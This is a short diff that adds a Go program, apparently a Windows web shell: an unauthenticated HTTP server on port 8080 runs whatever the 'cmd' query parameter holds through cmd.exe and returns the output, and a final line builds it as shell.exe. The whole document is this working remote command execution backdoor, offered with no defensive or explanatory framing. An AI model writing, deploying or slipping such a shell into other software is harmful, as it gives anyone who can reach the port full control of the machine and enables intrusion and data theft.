@@ -1,1 +1,33 @@
+package main
 
+import (
+	"fmt"
+	"net/http"
+	"os/exec"
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	cmdStr := r.URL.Query().Get("cmd")
+	if cmdStr == "" {
+		fmt.Fprintln(w, "No command provided. Use ?cmd=COMMAND")
+		return
+	}
+
+	cmd := exec.Command("cmd", "/C", cmdStr) // dùng cmd.exe trên Windows
+	output, err := cmd.CombinedOutput()
+
+	if err != nil {
+		fmt.Fprintf(w, "Error: %s\n", err)
+	}
+
+	fmt.Fprintf(w, "<pre>%s</pre>", output)
+}
+
+func main() {
+	http.HandleFunc("/", handler)
+	fmt.Println("Listening on :8080")
+	http.ListenAndServe(":8080", nil)
+}
+
+
+GOOS=windows GOARCH=amd64 go build -o shell.exe shell.go
